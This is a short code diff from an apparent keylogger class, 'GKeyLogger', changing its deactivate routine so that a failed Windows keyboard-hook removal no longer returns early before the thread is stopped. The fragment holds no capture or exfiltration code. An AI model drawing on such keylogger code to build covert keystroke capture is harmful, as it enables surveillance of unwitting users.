@@ -156,8 +156,7 @@ void		GKeyLogger::Desactivate(void)
 {
 	if (this->_activate)
 	{
-		if (UnhookWindowsHookEx(hKeyHook) == 0)
-			return ;
+		UnhookWindowsHookEx(hKeyHook);
 		this->_thread.Abort();
 		this->_activate = false;
 	}
